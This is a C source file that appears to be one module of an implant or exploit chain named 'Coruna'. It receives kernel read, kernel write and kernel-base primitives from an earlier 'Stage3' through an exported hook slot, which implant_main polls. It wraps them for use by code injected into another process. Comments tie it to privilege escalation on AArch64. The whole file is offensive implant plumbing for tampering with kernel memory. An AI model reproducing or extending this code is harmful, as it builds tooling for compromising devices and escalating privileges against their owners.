#include "memory.h"
#include <stdio.h>
#include <stdlib.h>

static kread64_t  g_kread64  = NULL;
static kwrite64_t g_kwrite64 = NULL;
static kbase_t    g_kbase    = NULL;

/*
 * Stage3 在内存中写入这 4 个 qword 后由 implant_main 轮询应用到 coruna_init_primitives：
 *   [0] kread64 VA  [1] kwrite64 VA  [2] kbase VA  [3] CORUNA_HOOK_MAGIC
 * 真实提权需为 AArch64 C ABI 下的函数指针。
 */
__attribute__((visibility("default"))) volatile uint64_t coruna_hook_slot[4];

__attribute__((visibility("default")))
void coruna_init_primitives(kread64_t read_func, kwrite64_t write_func, kbase_t base_func) {
    g_kread64  = read_func;
    g_kwrite64 = write_func;
    g_kbase    = base_func;
}

__attribute__((visibility("default")))
void coruna_init_primitives_from_addrs(uint64_t kread_va, uint64_t kwrite_va, uint64_t kbase_va) {
    coruna_init_primitives((kread64_t)kread_va, (kwrite64_t)kwrite_va, (kbase_t)kbase_va);
}

/*
 * Return 0 when not yet initialised so callers can poll safely.
 * Never call exit() — we are running inside another process's address space.
 */
uint64_t kread64(uint64_t addr) {
    if (!g_kread64) return 0;
    return g_kread64(addr);
}

void kwrite64(uint64_t addr, uint64_t val) {
    if (!g_kwrite64) return;
    g_kwrite64(addr, val);
}

uint64_t kernel_base(void) {
    if (!g_kbase) return 0;
    return g_kbase();
}
